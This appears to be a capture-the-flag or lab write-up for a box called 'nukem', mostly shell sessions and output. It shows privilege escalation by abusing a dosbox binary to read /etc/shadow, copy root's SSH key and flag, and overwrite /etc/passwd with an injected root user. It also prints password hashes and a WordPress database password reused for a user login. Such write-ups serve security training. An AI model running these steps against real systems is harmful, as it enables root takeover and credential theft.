ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1246:(snd_func_refer) error evaluating name
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:5231:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2660:(snd_pcm_open_noupdate) Unknown PCM default
CONFIG: Using default settings. Create a configfile to change them
MIXER:Can't open audio: No available audio device , running in nosound mode.
ALSA:Can't subscribe to MIDI port (65:0) nor (17:0)
MIDI:Opened device:none
[http@nukem tmp]$ cat OUTPUT
cat OUTPUT
root:$6$MfW0zuduZhJE.svF$uDYHDW7u7LPwfTQ3xLDHpEhHzU6kpeS6z7Mu0ySaF6LDahglkQb9O9zXpyO9wnB7VilPG6EAIzxvd9fPEtq/K0:18523::::::
bin:!*:18523::::::
daemon:!*:18523::::::
mail:!*:18523::::::
ftp:!*:18523::::::
http:!*:18523::::::
nobody:!*:18523::::::
dbus:!*:18523::::::
systemd-journal-remote:!*:18523::::::
systemd-network:!*:18523::::::
systemd-resolve:!*:18523::::::
systemd-timesync:!*:18523::::::
systemd-coredump:!*:18523::::::
uuidd:!*:18523::::::
mysql:!*:18523::::::
commander:$6$3VZ7hq78fMtj8Mvq$Fw0/SobxJO2J9yLrmO/8qEQcT9cR/ywQQktqS81IBswaJH5qi4z/htcKDpUhvxcK1zeNTpv0nBjjX/.1tM9qZ0:18523:0:99999:7:::
avahi:!*:18523::::::
colord:!*:18523::::::
lightdm:!*:18523::::::
polkitd:!*:18523::::::
usbmux:!*:18523::::::
git:!*:18523::::::
[http@nukem tmp]$ 
```

## Get flag

dosbox -c 'mount c /' -c "copy c:\root\.ssh\id_rsa c:\tmp\output" -c exit

```

[http@nukem tmp]$ dosbox -c 'mount c /' -c "copy c:\root\proof.txt  c:\tmp\output" -c exit
< -c "copy c:\root\proof.txt  c:\tmp\output" -c exit
DOSBox version 0.74-3
Copyright 2002-2019 DOSBox Team, published under GNU GPL.
---
ALSA lib confmisc.c:767:(parse_card) cannot find card '0'
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1246:(snd_func_refer) error evaluating name
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:5231:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2660:(snd_pcm_open_noupdate) Unknown PCM default
CONFIG: Using default settings. Create a configfile to change them
MIXER:Can't open audio: No available audio device , running in nosound mode.
ALSA:Can't subscribe to MIDI port (65:0) nor (17:0)
MIDI:Opened device:none
[http@nukem tmp]$ cat OUTPUT
cat OUTPUT
172a8a53c6b2578a9eb0cbeb237c27ab
```

## Databasr config - Commander

```bash
http@nukem python_rest_flask]$ cd ~
cd ~
[http@nukem http]$ ls
ls
index.php        wp-admin              wp-cron.php        wp-settings.php
latest.tar.gz    wp-blog-header.php    wp-includes        wp-signup.php
license.txt      wp-comments-post.php  wp-links-opml.php  wp-trackback.php
readme.html      wp-config-sample.php  wp-load.php        xmlrpc.php
wordpress        wp-config.php         wp-login.php
wp-activate.php  wp-content            wp-mail.php
[http@nukem http]$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'commander' );

/** MySQL database password */
define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
[http@nukem http]$ su commander
su commander
Password: CommanderKeenVorticons1990

[commander@nukem http]$ cd /tmp
cd /tmp
[commander@nukem tmp]$
```


## SSH
ssh by password doesnt really work so have to use ssh key

## it was dosbox all along fml

```

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat passwd
root:x:0:0::/root:/bin/bash
bin:x:1:1::/:/usr/bin/nologin
daemon:x:2:2::/:/usr/bin/nologin
mail:x:8:12::/var/spool/mail:/usr/bin/nologin
ftp:x:14:11::/srv/ftp:/usr/bin/nologin
http:x:33:33::/srv/http:/usr/bin/nologin
nobody:x:65534:65534:Nobody:/:/usr/bin/nologin
dbus:x:81:81:System Message Bus:/:/usr/bin/nologin
systemd-journal-remote:x:982:982:systemd Journal Remote:/:/usr/bin/nologin
systemd-network:x:981:981:systemd Network Management:/:/usr/bin/nologin
systemd-resolve:x:980:980:systemd Resolver:/:/usr/bin/nologin
systemd-timesync:x:979:979:systemd Time Synchronization:/:/usr/bin/nologin
systemd-coredump:x:978:978:systemd Core Dumper:/:/usr/bin/nologin
uuidd:x:68:68::/:/usr/bin/nologin
mysql:x:977:977:MariaDB:/var/lib/mysql:/usr/bin/nologin
commander:x:1000:1000::/home/commander:/bin/bash
avahi:x:976:976:Avahi mDNS/DNS-SD daemon:/:/usr/bin/nologin
colord:x:975:975:Color management daemon:/var/lib/colord:/usr/bin/nologin
lightdm:x:974:974:Light Display Manager:/var/lib/lightdm:/usr/bin/nologin
polkitd:x:102:102:PolicyKit daemon:/:/usr/bin/nologin
usbmux:x:140:140:usbmux user:/:/usr/bin/nologin
git:x:973:973:git daemon user:/:/usr/bin/git-shell
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ echo "dummyroot:EyJdPLm4o5WkY:0:0:root:/root:/bin/bash" >> passwd
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 

```

```bash

[commander@nukem tmp]$ dosbox -c 'mount c /' -c "copy c:\tmp\passwd c:\etc\passwd" -c exit
< c /' -c "copy c:\tmp\passwd c:\etc\passwd" -c exit
DOSBox version 0.74-3
Copyright 2002-2019 DOSBox Team, published under GNU GPL.
---
ALSA lib confmisc.c:767:(parse_card) cannot find card '0'
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1246:(snd_func_refer) error evaluating name
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:5231:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2660:(snd_pcm_open_noupdate) Unknown PCM default
CONFIG:Loading primary settings from config file /home/commander/.dosbox/dosbox-0.74-3.conf
MIXER:Can't open audio: No available audio device , running in nosound mode.
ALSA:Can't subscribe to MIDI port (65:0) nor (17:0)
MIDI:Opened device:none
[commander@nukem tmp]$ su dummyroot
su dummyroot
Password: password

Warning: your password will expire in 32744 days.
[root@nukem tmp]# cd /root
cd /root
[root@nukem ~]# ```

# Other

dosbox -c 'mount c /' -c "echo  >>c:\tmp\passwd" -c exit

dosbox -c 'mount c /' -c "copy c:\tmp\passwd c:\etc\passwd" -c exit

```

![](https://cdn.discordapp.com/attachments/733848815089745940/944258461062017074/Screenshot_20220218-220136_TeamViewer.jpg)